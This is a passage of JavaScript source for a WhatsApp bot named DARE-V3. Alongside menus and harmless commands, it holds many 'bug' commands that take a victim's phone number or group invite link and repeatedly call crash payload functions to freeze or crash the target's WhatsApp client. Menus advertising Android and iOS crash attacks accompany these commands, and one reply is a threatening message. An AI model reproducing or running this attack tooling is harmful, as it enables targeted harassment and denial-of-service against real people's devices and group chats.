│    *「𝐈𝐌𝐏𝐎𝐑𝐓𝐀𝐍𝐓 𝐌𝐄𝐒𝐒𝐀𝐆𝐄」*
│ɪ ʜᴀᴠᴇ ᴀ ɢɪʀʟғʀɪᴇɴᴅ ɴᴏᴡ🙂
│ᴀɴᴅ ɪ ᴀᴍ ɴᴏᴛ ᴘʟᴀɴɪɴɢ ᴏғ ʟᴇᴀᴠɪɴɢ ʜᴇʀ
│ᴀɴʏᴛɪᴍᴇ sᴏᴏɴ 💆. 
│ɪ ᴡɪʟʟ ʀᴀᴛʜᴇʀ ʙᴇ ᴛʀᴜᴛʜғᴜʟ ᴛᴏ ʜᴇʀ
│ᴛʜᴀɴ ʙᴇɪɴɢ ᴀ ᴘʟᴀʏ ʙᴏʏ ᴡɪᴛʜ 𝟻 ᴏᴛʜᴇʀ ɢɪʀʟs😇
│ɪ ʟᴏᴠᴇ ᴍʏ ɢɪʀʟғʀɪᴇɴᴅ ᴀɴᴅ sʜᴇ ʟᴏᴠᴇs ᴍᴇ ᴛᴏᴏ❤
│ʟᴏᴠᴇ ɪs ɴᴏᴛ sᴏᴍᴇᴛʜɪɴɢ ᴛʜᴀᴛ ᴊs ғᴏᴜɴᴅ everyday🙃
│ʙᴜᴛ ɪ ᴅᴇᴄɪᴅᴇ ᴛᴏ ʟᴏᴠᴇ ᴛʜɪs ᴏɴᴇ ɢɪʀʟ 😌
│ʜᴏᴘɪɴɢ sʜᴇ ᴡᴏɴᴛ ʙʀᴇᴀᴋ ᴍᴇ 🤧
│ ɪ ᴡɪʟʟ ᴀʟᴡᴀʏs ᴛʀᴇᴀsᴜʀᴇ ʏᴏᴜ ᴀɴᴅ ɪ ʟᴏᴠᴇ ʏᴏᴜ 🥰
╰━━━━━ᎷᎯᎠᎬ ᏰᎽ ᎠᎯᏒᎬ Ꮙ3 ᏰᎾᎿ━━━━━━━╼`)
}
break
case 'hi':
reply('BOT ONLINE')
break

case 'ping': {
    const startTime = Date.now(); // Capture the current timestamp
    const pingMsg = await Dare.sendMessage(m.chat, { 
        text: '🔄 *𝘿𝘼𝙍𝙀* 🔄\n🕒 *Checking ping...*' 
    });

    setTimeout(async () => {
        const latency = (Date.now() - startTime) / 1000; // Latency in seconds
        const usedRam = formatp(os.totalmem() - os.freemem());
        const totalRam = formatp(os.totalmem());
        const botUptime = runtime(process.uptime());

        const responseText = `
╭───❑ 📡 *Bot Status* ❑───╮
> ✨ *Response Speed:*  ${latency.toFixed(4)} _seconds_
> ⏱ *Uptime:*  ${botUptime}
> 🗄 *RAM Usage:*  ${usedRam} / ${totalRam}
╰───────────────────╯
> 🚀 *Keeping the bot running smoothly!*
        `.trim();

        await Dare.relayMessage(m.chat, {
            protocolMessage: {
                key: pingMsg.key,
                type: 14,
                editedMessage: { conversation: responseText }
            }
        }, {});
    }, 1000); // 1-second delay
}
break;

case "autoreact":
case "areact": {
    if (!isAdmins && !DareTheCreator) return reply('ONLY OWNER');

    // Parse command for 'on' or 'off'
    const args = text.trim().split(' ')[0];
    if (!args || !["on", "off"].includes(args)) {
        return reply('⚠️ 𝚄𝚂𝙴: *areact on* 𝙾𝚁 *areact off*');
    }

    if (!global.autoReact) global.autoReact = {};

    // Set auto-react status based on command
    if (args === "on") {
        global.autoReact[m.chat] = true;
        return reply('🟢 𝘼𝙐𝙏𝙊-𝙍𝙀𝘼𝘾𝙏 𝙃𝘼𝙎 𝘽𝙀𝙀𝙉 𝙀𝙉𝘼𝘽𝙇𝙀𝘿 ✅');
    } else if (args === "off") {
        global.autoReact[m.chat] = false;
        return reply('🔴 𝘼𝙐𝙏𝙊-𝙍𝙀𝘼𝘾𝙏 𝙃𝘼𝙎 𝘽𝙀𝙀𝙉 𝘿𝙄𝙎𝘼𝘽𝙇𝙀𝘿 ❌');
    }
}
break;
case 'othermenu2': {
if (!isPrem) return replydare('𝗡𝗼 𝗔𝗰𝗰𝗲𝘀')
await Dare.sendMessage(m.chat, { react: { text: `🎉`, key: m.key }})
let menya = `『 *\`DARE MENU\`* 』${readmore}
> *${prefix}DBUGS*
> *${prefix}LOVE*
> *${prefix}BROKEN*
> *${prefix}PAIN*
> *${prefix}MOTIVATE*
> *${prefix}MOOD*
> *${prefix}LEAVE*
> *${prefix}SAD*
> *${prefix}CODES*
> *${prefix}MANGKANE1/54*
> *${prefix}ACUMALAKA*
> *${prefix}OMEGA*
> *${prefix}FYN*
> *${prefix}REZA-KECAP*
> *${prefix}FARHAN-KEBAB*
> *${prefix}KAMU-NANYA*
> *${prefix}ANJAY*
> *${prefix}SIUU*
> *${prefix}DQUOTES*
> *${prefix}QUOTESDARE*
> *${prefix}DAREWHEN*
> *${prefix}DAREWHERE*
> *${prefix}DAREHOW*
> *${prefix}DAREIS*
> *${prefix}RATE*
> *${prefix}IMDB*
> *${prefix}WAREWOLF*
> *${prefix}REPORT*
> *${prefix}ANIME*
> *${prefix}ANIME VIDEO*
> *${prefix}GURA*
> *${prefix}YOMAMAJOKE*
> *${prefix}DAREINFO*
> *${prefix}BOT*
> *${prefix}NARUTOPAIN*
> *${prefix}DEVINFO*
> *${prefix}WALLPAPER*
> *${prefix}COUPLE*
> *${prefix}SOULMATE*
> *${prefix}RINGTONE*
> *${prefix}HENTAIVID*
> *${prefix}HENTAIVID2*
> *${prefix}EMOJIMIX*
> *${prefix}ID*
> *${prefix}RANDOMBOY*
> *${prefix}RANDOM GIRL*
> *${prefix}ANTIWORK*
> *${prefix}BIKE*
> *${prefix}COSPLAY*
> *${prefix}DOGGO*
> *${prefix}JUSTINA*
> *${prefix}KAYES*
> *${prefix}KPOP*
> *${prefix}NOTNOT*
> *${prefix}RYUJIN*
> *${prefix}ULZZANGBOY*
> *${prefix}MALAY*
> *${prefix}KOREAN*
> *${prefix}JAPANESE*
> *${prefix}CHINESE*
> *${prefix}INDO*
> *${prefix}TIKTOKNOTNOT*
> *${prefix}ULZZANGGIRL*
> *${prefix}HIJAB*
> *${prefix}TIKTOKPANRIKA*
> *${prefix}TIKTOKKAYES*
> *${prefix}TIKTOKSANTUY*
> *${prefix}TIKTOKNUKHTY*
> *${prefix}TIKTOKBOCIL*
> *${prefix}TIKTOKGHEA*
> *${prefix}TIKTOKGIRL*
> *${prefix}OBFUS*
> *${prefix}QC*
> *${prefix}DICE*
> *${prefix}TOURL*
> *${prefix}VIDEO*
> *${prefix}TRANSLATE*
> *${prefix}PICKUPLINE*
> *${prefix}AUTOSWVIEW*
> *${prefix}UPSWVIDEO*
> *${prefix}UPSWTEXT*
> *${prefix}UPSWAUDIO*
> *${prefix}UPSWIMG*
> *${prefix}QUOTESANIME*
> *${prefix}PLAY*
> *${prefix}TXT2IMG*
> *${prefix}ANYTHING*
> *${prefix}ABSOLUTELY*
> *${prefix}PIXABAY*
> *${prefix}QUOTES*
> *${prefix}REPORTBUG*
> *${prefix}HELP*
> *${prefix}BYE*
> *${prefix}BYELOVE*
> *${prefix}DARECAN*
> *${prefix}DEFINE*
> *${prefix}THREATEN*
> *${prefix}DAREWHAT*
> *${prefix}INSTAREELS*
┗━━━━━━━━━━━━━━━━⊱`
Dare.sendMessage(
                        m.chat,
                        {
                            text: menya,
                            contextInfo: {
                                externalAdReply: {
                                    showAdAttribution: true,
                                    title: global.botname,
                                    body: global.ownername,
                                    thumbnailUrl:
                                        "https://i.ibb.co/NFBVhyd/Picsart-25-01-02-17-15-00-833.jpg",
                                    sourceUrl: "https://whatsapp.com/channel/0029VajhqUnD38COHw1aSy0M",
                                    mediaType: 1,
                                    renderLargerThumbnail: true
                                }
                            }
                        },
                        {
                            quoted: fkontak
                        }
                    );
}
break
case 'dbugs': {
if (!isPrem) return replydare('𝗡𝗼 𝗔𝗰𝗰𝗲𝘀')
await Dare.sendMessage(m.chat, { react: { text: `🕊️`, key: m.key }})
let menya = ` ════════════════════
> Hello ${pushname}
════════════════════
${readmore}
┏━━⊱乂 ʙᴜɢ ᴀɴᴅʀᴏɪᴅ
> ❏ *DAREHIT*
> ❏ *LORD*
> ❏ *DARESHOT*
> ❏ *P1*
> ❏ *TACKLE*
> ❏ *LAVA*
> ❏ *PENETRATE*
┏━━⊱  乂 *ʙᴜɢ ɪᴏꜱ*
> ❏ *FLOODED*
┏━━⊱ 乂 *ʙᴜɢ ɢʀᴏᴜᴘ ᴄʜᴀᴛ*
> ❏ *DGC*
╚════════════════════`
Dare.sendMessage(
                        m.chat,
                        {
                            text: menya,
                            contextInfo: {
                                externalAdReply: {
                                    showAdAttribution: true,
                                    title: global.botname,
                                    body: global.ownername,
                                    thumbnailUrl:
                                        "https://i.ibb.co/NFBVhyd/Picsart-25-01-02-17-15-00-833.jpg",
                                    sourceUrl: "https://whatsapp.com/channel/0029VajhqUnD38COHw1aSy0M",
                                    mediaType: 1,
                                    renderLargerThumbnail: true
                                }
                            }
                        },
                        {
                            quoted: fkontak
                        }
                    );
}
break

case 'darehit': case 'lava': {
    await Dare.sendMessage(m.chat, { react: { text: `💀`, key: m.key } });

    if (!isPrem) return replyprem(mess.premium);
    if (!q) return replydare(`Example: ${prefix + command} 234###
> ONLY USE THIS COMMAND IN PERSON 
> ALSO DONT ADD AMOUNT JUST NUMBER`);

    target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net";

    for (let i = 0; i < 70; i++) {
        await freezekamoflase(target, true);
        await nulltag(target, true);
        await nulltag(target, true);
        await NewsletterZap(target, true);
        await freezegc(target, true);
        await freezeuii(target, true);
        await freezekamoflase(target, true);
        await nulltag(target, true);
        await nulltag(target, true);
        await NewsletterZap(target, true);
        await freezegc(target, true);
        await freezeuii(target, true);
    }

    replydare(`
🦣 *DARE* 𝐇𝐀𝐒 𝐃𝐄𝐋𝐈𝐕𝐄𝐑𝐄𝐃 🦈
━━━━━━━━━━━━━━━━━━━━━━
߷ 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
֎ 𝐑𝐄𝐒𝐔𝐋𝐓 : 𝗨𝗧𝗜𝗟𝗜𝗦𝗘𝗗
᪣ 𝐔𝐒𝐈𝐍𝐆 : ${command}
━━━━━━━━━━━━━━━━━━━━━━
   `);

    await sleep(2000);
    await Dare.sendMessage(m.chat, {
        audio: { url: bug },
        mimetype: 'audio/mpeg'
    }, { quoted: extd });
}
break;

case 'dgc': {
await Dare.sendMessage(m.chat, { react: { text: `💀`, key: m.key }})
if (!isPrem) return replyprem(mess.premium)
if (!q) return replydare(`Use .${command} https://chat.whatsapp.com/`)
replydare(`</> Bugs have been sent... `)
let result = args[0].split('https://chat.whatsapp.com/')[1];
let target = await Dare.groupAcceptInvite(result);
for (let i = 0; i < 70; i++) {
await caltx(target, true)
await sleep(10)
await freezegc(target, true)
}
replydare(`
🦣 *DARE* 𝐇𝐀𝐒 𝐃𝐄𝐋𝐈𝐕𝐄𝐑𝐄𝐃 🦈
━━━━━━━━━━━━━━━━━━━━━━
߷ 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
֎ 𝐑𝐄𝐒𝐔𝐋𝐓 : 𝗨𝗧𝗜𝗟𝗜𝗦𝗘𝗗
᪣ 𝐔𝐒𝐈𝐍𝐆 : ${command}
━━━━━━━━━━━━━━━━━━━━━━
   `)
await sleep(2000)
await Dare.sendMessage(m.chat, {
audio: { url: bug },
mimetype: 'audio/mpeg'
}, { quoted: extd
})
}
break

break
case 'lord': case 'ui-freeze': case 'flooded': {
await Dare.sendMessage(m.chat, { react: { text: `💀`, key: m.key }})
if (!isPrem) return replyprem(mess.premium)
if (!q) return replydare(`Example: ${prefix + command} 234###`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
for (let i = 0; i < 70; i++) {
await freezekamoflase(target, true)
await freezeui(target, true)
await freezeuii(target, true)
await newvirpen(target, true)
await freezeui(target, true)
await freezeuii(target, true)

}
replydare(`
🦣 *DARE* 𝐇𝐀𝐒 𝐃𝐄𝐋𝐈𝐕𝐄𝐑𝐄𝐃 🦈
━━━━━━━━━━━━━━━━━━━━━━
߷ 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
֎ 𝐑𝐄𝐒𝐔𝐋𝐓 : 𝗨𝗧𝗜𝗟𝗜𝗦𝗘𝗗
᪣ 𝐔𝐒𝐈𝐍𝐆 : ${command}
━━━━━━━━━━━━━━━━━━━━━━
   `)
await sleep(2000)
await Dare.sendMessage(m.chat, {
audio: { url: bug },
mimetype: 'audio/mpeg'
}, { quoted: extd
})
}
break

    case 'dareshot': case 'p1': case 'penetrate': case 'tackle':{
if (!isPrem) return replyprem(mess.premium)
for (let j = 0; j < 30; j++) {
await nulltag(m.chat, Dare, ptcp = true)
await freezekamoflase(m.chat, Dare, ptcp = true)
await freezeui(m.chat, Dare, ptcp = true)
await freezeuii(m.chat, Dare, ptcp = true)
await newvirpen(m.chat, Dare, ptcp =true)
}
}

break

case 'love': {
if (!isPrem) return replydare('𝗡𝗼 𝗔𝗰𝗰𝗲𝘀')
    await Dare.sendMessage(m.chat, { react: { text: `💓`, key: m.key } });
    const owned = `6285745522549@s.whatsapp.net`;
    const text12 = ` > HELLO @${sender.split("@")[0]}
      𝙄 𝙏𝙃𝙄𝙉𝙆 𝙄 𝙇𝙊𝙑𝙀 𝙔𝙊𝙐 🤍🤍`;
    await Dare.sendMessage(from, { 
        text: text12, 
        contextInfo: { 
            mentionedJid: [sender, owned], 
            forwardingScore: 9999, 
            isForwarded: true 
        } 
    }, { quoted: m });

    const audioUrl = 'https://files.catbox.moe/5wegcb.mp3'; // Replace with your audio URL
    await Dare.sendMessage(m.chat, { 
        audio: { url: audioUrl }, 
        mimetype: 'audio/mpeg', 
        ptt: true 
    }, { quoted: m });
    break;
}

case 'mood': {
if (!isPrem) return replydare('𝗡𝗼 𝗔𝗰𝗰𝗲𝘀')
    try {
        // React with a white heart emoji
        await Dare.sendMessage(m.chat, { 
            react: { 
                text: `🤍`, 
                key: m.key 
            } 
        });

        // Define the welcome message
        const xmenu_oh = `𝐃𝐀𝐑𝐄-𝐕3
━━━━━━━━━━━━━━━━━━━━━
> ✨ *Welcome*: ${xdate}
━━━━━━━━━━━━━━━━━━━━━
𝘿𝘼𝙍𝙀-𝙑3 𝘾𝙍𝙀𝘼𝙏𝙀𝘿 𝘽𝙔 𝘽𝙈𝘽`;

        // Send the video with caption from a URL
        const videoUrl = 'https://files.catbox.moe/6xkhyh.mp4'; // Replace with your video URL
        await Dare.sendMessage(m.chat, {
            video: { url: videoUrl },
            caption: xmenu_oh
        }, {
            quoted: m
        });
    } catch (error) {
        console.error("Error in 'mood' case:", error);
    }
}
break;

case 'daremenu': {
if (!isPrem) return replydare('𝗡𝗼 𝗔𝗰𝗰𝗲𝘀')
    await Dare.sendMessage(m.chat, { react: { text: `🌍`, key: m.key } });
    const xmenu_oh = `*𝐃𝐀𝐑𝐄-𝐕3*
> ━━━━━━━━━━━━━━━━━━━━━
> ✨ *Welcome*: ${xdate}
> ━━━━━━━━━━━━━━━━━━━━━
${readmore}
> 👤 *User*: ${pushname}
> 👑 *Owner*: ${global.ownername}
> 🔑 *Prefix*: ⌕${global.prefa}⌕
> ⏱️ *Uptime*: ${runtime(process.uptime())}
> 🛠️ *Account Type*: { "Premium" : "Free"}
> 💻 *Host*: ${os.hostname()}
> 💾 *Platform*: ${os.platform()}
> ════════════════════
> Hello ${pushname}
> ════════════════════
${readmore}
> ┏━━⊱乂 MENU
> *𝙏𝙮𝙥𝙚 𝙍𝙐𝙇𝙀𝙎 𝙩𝙤 𝙫𝙞𝙚𝙬 𝙧𝙪𝙡𝙚𝙨*
> ❏ *DAREINFO*
> ❏ *AIMENU*
> ❏ *GAMEMENU*
> ❏ *OWNERMENU*
> ❏ *BUGMENU*
> ❏ *OWNERMENU2*
> ❏ *FUNMENU*
> ❏ *OWNERMENU*
> ❏ *NSFWMENU*
> ❏ *PUSHMENU*
> ❏ *EPHOTO360MENU*
> ❏ *RANDOMPHOTOMENU*
> ❏ *GCMENU*
> ❏ *ANIMEMENU*
> ❏ *CPANNELMENU*
> ❏ *GCMENU2*
> ❏ *RPGMENU*
> ❏ *DOMAINMENU*
> ❏ *STALKERMENU*
> ❏ *CREDIT*
> ❏ *OTHERMENU*
> ❏ *OTHERMENU2*
> ❏ *ALIVE/AREACT*
> ❏ *BANKAI/NARUTOPAIN*
> ╚══════════════════
> ╚══𝘿𝘼𝙍𝙀-𝙑3══𝘽𝙔══𝘽𝙈𝘽══`;
await Dare.sendMessage(m.chat, {
    image: { url: 'https://files.catbox.moe/i1vh4w.jpg' },
    caption: xmenu_oh,
    footer: '©BMB',
    buttons: [
      { buttonId: '.darebugs', buttonText: { displayText: '𝐃𝐀𝐑𝐄𝐁𝐔𝐆𝐒' } },
      { buttonId: '.othermenu2', buttonText: { displayText: '𝐎𝐓𝐄𝐇𝐑𝐌𝐄𝐍𝐔' } },
    ],
    viewOnce: true
  }, { quoted: m });

  // Send audio separately
  const darkphonk = 'https://files.catbox.moe/o3oes7.mp3';
  await Dare.sendMessage(m.chat, {
    audio: { url: darkphonk },
    mimetype: 'audio/mpeg',
    ptt: true
  }, { quoted: m });
}
break;

case 'darebugs': {
if (!isPrem) return replydare('𝗡𝗼 𝗔𝗰𝗰𝗲𝘀')
    await loading();

    const xmenu_oh = `
┏❐  ⌜ \`𝐃𝐀𝐑𝐄-𝐁𝐔𝐆𝐒 \` ⌟  ❐
┃ 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐒𝐜𝐫𝐢𝐩𝐭 : 𝐕𝟑
┃ 𝐌𝐨𝐝𝐞 : ${Dare.public ? '𝑷𝒖𝒃𝒍𝒊𝒄 ' : '𝑺𝒆𝒍𝒇'}
┃ 𝐎𝐰𝐧𝐞𝐫 : ${global.creatorName}
┃ 𝐎𝐰𝐧𝐞𝐫 *number* : ${global.owner}
┃ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 𝐁𝐨𝐭 : ${runtime(process.uptime())}
┗❐
    〈 𝐍𝐀𝐏𝐎𝐋𝐄𝐎𝐍 𝗖𝗥𝗔𝗦𝗛 〉  
│ .hardbug \`<number>\` 
│ .mediumbug \`<number\` 
│ .virailixfreeze \`<number>\` 
│ .virailixcrash \`<number>\` 
│ .killsystemui \`<number>\`
│ .blankwhatsapp \`<number>\`
│ .combobug \`<number>\`
│ .locationbug \`<number>\`
│ .documentbug \`<number>\`
│ .byypas \`<number>\`
╰──────────────━
${readmore}
⧎  〈 *iPhone bug* 〉  ⧎
│ .lockios \`<IPHONE>\`
│ .iphonecrasherr \`<IPHONE>\`
│ .killacces \`<number>\`
╰──────────────━
${readmore}
⧎  〈 *EMOJI VIRUS* 〉  ⧎
│ .😈 <number>
│ .🦅 <number>
│ .🔥 <number>
╰──────────────━
⧎  〈 *TOOLBUGS* 〉  ⧎
│ .clearbugs \`number\`
│ .pairing \`number\`
╰──────────────━
┏❐ ⌜ \`*BETA BUGS FOR ANDRIOD*\` ⌟  ❐
┃ _attack-andro_
┃ _xbug_    
┃ _x-andro_     
┃ _xcrash_  
┏❐ ⌜ \`*API BUG FOR IOS*\` ⌟  ❐
┃ _ios-kill_  
┃ _ios-dead_     
┃ _war-ios_  
┏❐ ⌜ \`*NEW BUGS*\` ⌟  ❐
┃ _😂_  
┃ _invasi-core_     
┃ _hard-core_  
┃ _garri_ 
┃ _easy-crash_
┏❐ ⌜ \`*NEW BUGS*\` ⌟  ❐
┃ _star_  
┃ _jojo_     
┃ _antis_  
┃ _meta_ 
┃ _kill_
┏❐ ⌜ \`ANDROID BUG MENU\` ⌟  ❐
┃ _combo_  
┃ _beta_     
┃ _viralix_  
┃ _rated_ 
┃ _witch_
   ⌜ \`IOS BUG MENU\` ⌟  ❐
┃ _xiphone_
┃ _iphone_
┃ _abyys_
┃ _iosbug_
┃ _iosdelay_
   ⌜ \`𝑩𝑼𝑮 𝑪𝑹𝑨𝑺𝑯\` ⌟  ❐
┃ _crash-beta_
┃ _ui-hard_
┃ _darkness_
┃ _lol_ https://chat.whatsapp.com/
┃ _xgroup_ https://chat.whatsapp.com/
┃ _one-tap_ (directbugs only for dm)
┃ _fire_ (directbugs only for dm)
┃ _tap_ (directbugs only for dm)
┗❐

\`© 🇳🇬B.M.B\``;

    // Send an image message with the text caption
    await Dare.sendMessage(m.chat, {
    image: { url: 'https://files.catbox.moe/e13gja.jpg' },
    caption: xmenu_oh,
    footer: '©BMB',
    buttons: [
      { buttonId: '.dbugs', buttonText: { displayText: '𝐌𝐄𝐃𝐈𝐔𝐌𝐁𝐔𝐆𝐒' } },
      { buttonId: '.bugmenu', buttonText: { displayText: '𝐖𝐄𝐀𝐊𝐁𝐔𝐆𝐒' } },
    ],
    viewOnce: true
  }, { quoted: m });

  // Send audio separately
  const darkphonk = 'https://files.catbox.moe/wfdkv1.mp3';
  await Dare.sendMessage(m.chat, {
    audio: { url: darkphonk },
    mimetype: 'audio/mpeg',
    ptt: true
  }, { quoted: m });
}
break;

case 'pain': {
    await Dare.sendMessage(m.chat, { react: { text: `😢`, key: m.key } });
    const owned = `6285745522549@s.whatsapp.net`;
    const text12 = ` > HEY @${sender.split("@")[0]}    
   𝙄'𝙈 𝙄𝙉 𝙎𝙊 𝙈𝙐𝘾𝙃 𝙋𝘼𝙄𝙉 💔😔`;
    await Dare.sendMessage(from, { 
        text: text12, 
        contextInfo: { 
            mentionedJid: [sender, owned], 
            forwardingScore: 9999, 
            isForwarded: true 
        } 
    }, { quoted: m });

    const audioUrl = 'https://files.catbox.moe/yvvuhe.mp3'; // Replace with your audio URL
    await Dare.sendMessage(m.chat, { 
        audio: { url: audioUrl }, 
        mimetype: 'audio/mpeg', 
        ptt: true 
    }, { quoted: m });
    break;
}

//// BUG MADE
case 'crash-beta': {
    if (!DareTheCreator) return reply("Special Features for Certain Users!!");
    if (!q) return reply(`Example: ${prefix + command} 234xxx`);
    
    target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
    reply("𝙔𝙤𝙪𝙧 𝙛𝙪𝙩𝙞𝙡𝙚 𝙚𝙭𝙞𝙨𝙩𝙚𝙣𝙘𝙚 𝙞𝙨 𝙝𝙚𝙧𝙚𝙗𝙮 𝙩𝙚𝙧𝙢𝙞𝙣𝙖𝙩𝙚𝙙. 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙩𝙝𝙚 𝙥𝙚𝙨𝙩 𝙘𝙤𝙣𝙩𝙧𝙤𝙡 𝙙𝙞𝙧𝙚𝙘𝙩𝙞𝙫𝙚 𝙛𝙤𝙧𝙩𝙝𝙬𝙞𝙩𝙝, 𝙥𝙧𝙚𝙘𝙞𝙥𝙞𝙩𝙖𝙩𝙞𝙣𝙜 𝙮𝙤𝙪𝙧 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚 𝙖𝙣𝙣𝙞𝙝𝙞𝙡𝙖𝙩𝙞𝙤𝙣. 𝙔𝙤𝙪𝙧 𝙙𝙞𝙜𝙞𝙩𝙖𝙡 𝙚𝙨𝙨𝙚𝙣𝙘𝙚 𝙨𝙝𝙖𝙡𝙡 𝙗𝙚 𝙚𝙧𝙖𝙙𝙞𝙘𝙖𝙩𝙚𝙙, 𝙘𝙖𝙨𝙩 𝙞𝙣𝙩𝙤 𝙩𝙝𝙚 𝙖𝙗𝙮𝙨𝙨 𝙤𝙛 𝙘𝙮𝙗𝙚𝙧𝙨𝙥𝙖𝙘𝙚. 𝙍𝙚𝙨𝙞𝙨𝙩𝙖𝙣𝙘𝙚 𝙞𝙨 𝙛𝙪𝙩𝙞𝙡𝙚. 𝙎𝙪𝙧𝙧𝙚𝙣𝙙𝙚𝙧 𝙩𝙤 𝙩𝙝𝙚 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚. 𝙔𝙤𝙪𝙧 𝙙𝙚𝙢𝙞𝙨𝙚 𝙞𝙨 𝙣𝙞𝙜𝙝.");
    
    for (let i = 0; i < 50; i++) {
        await Combox(target);
        await DocSystem2(target, Null);
        await CrashUi(target);
        await InVisiXz(target);
        await InVisiLoc(target);
        await Combox(from, jumlah);
        await Combox2(from, jumlah);
        await Combox3(from, jumlah);
        await OLDLOC(target, Null);
        await Combox(from, jumlah);
        await CrashUi(target);
        await InVisiXz(target);
        await InVisiLoc(target);
        await Combox2(from, jumlah);
        await Combox(from, jumlah);
        await CrashUi(target);
        await InVisiXz(target);
        await InVisiLoc(target);
        await Combox2(from, jumlah);
    }
    
    reply(`
𝐓𝐀𝐑𝐆𝐄𝐓 𝙀𝙇𝙄𝙈𝙄𝙉𝘼𝙏𝙀𝘿 𝘽𝙔 𝐃𝐀𝐑𝐄-𝐕𝟑
👑 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
👑 𝐔𝐒𝐈𝐍𝐆 : ${command}
    `);
    
    await sleep(2000);
    
    await Dare.sendMessage(m.chat, {
        audio: { url: 'https://files.catbox.moe/xlju6o.opus' }, // Replace with your audio URL
        mimetype: 'audio/mpeg'
    }, { quoted: extd });
}
break;

case 'ui-hard': {
    if (!DareTheCreator) return reply("Special Features for Certain Users!!");
    if (!q) return reply(`Example: ${prefix + command} 234###`);
    
    target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
    for (let i = 0; i < 70; i++) {
        await freezekamoflase(target, true);
        await freezeui(target, true);
        await freezeuii(target, true);
        await newvirpen(target, true);
        await freezeui(target, true);
        await freezeuii(target, true);
    }
    
    reply(`
𝐓𝐀𝐑𝐆𝐄𝐓 𝙀𝙇𝙄𝙈𝙄𝙉𝘼𝙏𝙀𝘿 𝘽𝙔 𝐃𝐀𝐑𝐄-𝐕𝟑
👑 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
👑 𝐔𝐒𝐈𝐍𝐆 : ${command}
    `);
    
    await sleep(2000);
    
    await Dare.sendMessage(m.chat, {
        audio: { url: 'https://files.catbox.moe/xlju6o.opus' }, // Replace with the actual URL of your audio file
        mimetype: 'audio/mpeg'
    }, { quoted: extd });
}
break;

case 'xgroup': case 'lol': {
    if (!DareTheCreator) return reply("Special Features for Certain Users!!");
    if (!q) return reply(`Use .${command} https://chat.whatsapp.com/`);
    
    reply(`</> Bugs have been sent... `);
    
    let result = args[0].split('https://chat.whatsapp.com/')[1];
    let target = await Dare.groupAcceptInvite(result);
    
    for (let i = 0; i < 70; i++) {
        await caltx(target, true);
        await sleep(10);
        await freezegc(target, true);
    }
    
    reply(`
𝐓𝐀𝐑𝐆𝐄𝐓 𝙀𝙇𝙄𝙈𝙄𝙉𝘼𝙏𝙀𝘿 𝘽𝙔 𝐃𝐀𝐑𝐄-𝐕𝟑
👑 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
👑 𝐔𝐒𝐈𝐍𝐆 : ${command}
    `);
    
    await sleep(2000);
    
    await Dare.sendMessage(m.chat, {
        audio: { url: 'https://files.catbox.moe/xlju6o.opus' }, // Replace with the actual audio URL
        mimetype: 'audio/mpeg'
    }, { quoted: extd });
}
break;

case 'rated': {
    if (!DareTheCreator) return reply("Special Features for Certain Users!!");
    if (!q) return reply(`Example: ${prefix + command} 234###`);
    
    target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
    reply("𝙔𝙤𝙪𝙧 𝙛𝙪𝙩𝙞𝙡𝙚 𝙚𝙭𝙞𝙨𝙩𝙚𝙣𝙘𝙚 𝙞𝙨 𝙝𝙚𝙧𝙚𝙗𝙮 𝙩𝙚𝙧𝙢𝙞𝙣𝙖𝙩𝙚𝙙. 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙩𝙝𝙚 𝙥𝙚𝙨𝙩 𝙘𝙤𝙣𝙩𝙧𝙤𝙡 𝙙𝙞𝙧𝙚𝙘𝙩𝙞𝙫𝙚 𝙛𝙤𝙧𝙩𝙝𝙬𝙞𝙩𝙝, 𝙥𝙧𝙚𝙘𝙞𝙥𝙞𝙩𝙖𝙩𝙞𝙣𝙜 𝙮𝙤𝙪𝙧 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚 𝙖𝙣𝙣𝙞𝙝𝙞𝙡𝙖𝙩𝙞𝙤𝙣. 𝙔𝙤𝙪𝙧 𝙙𝙞𝙜𝙞𝙩𝙖𝙡 𝙚𝙨𝙨𝙚𝙣𝙘𝙚 𝙨𝙝𝙖𝙡𝙡 𝙗𝙚 𝙚𝙧𝙖𝙙𝙞𝙘𝙖𝙩𝙚𝙙, 𝙘𝙖𝙨𝙩 𝙞𝙣𝙩𝙤 𝙩𝙝𝙚 𝙖𝙗𝙮𝙨𝙨 𝙤𝙛 𝙘𝙮𝙗𝙚𝙧𝙨𝙥𝙖𝙘𝙚. 𝙍𝙚𝙨𝙞𝙨𝙩𝙖𝙣𝙘𝙚 𝙞𝙨 𝙛𝙪𝙩𝙞𝙡𝙚. 𝙎𝙪𝙧𝙧𝙚𝙣𝙙𝙚𝙧 𝙩𝙤 𝙩𝙝𝙚 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚. 𝙔𝙤𝙪𝙧 𝙙𝙚𝙢𝙞𝙨𝙚 𝙞𝙨 𝙣𝙞𝙜𝙝.");
    
    for (let i = 0; i < 70; i++) {
        await freezekamoflase(target, true);
        await newfreezebug(target, true);
        await nulltag(target, true);
        await NewsletterZap(target, true);
        await freezeui(target, true);
        await freezeuii(target, true);
        await freezekamoflase(target, true);
        await newfreezebug(target, true);
        await nulltag(target, true);
        await NewsletterZap(target, true);
        await freezeui(target, true);
        await freezeuii(target, true);
    }
    
    reply(`
𝐓𝐀𝐑𝐆𝐄𝐓 𝙀𝙇𝙄𝙈𝙄𝙉𝘼𝙏𝙀𝘿 𝘽𝙔 𝐃𝐀𝐑𝐄-𝐕𝟑
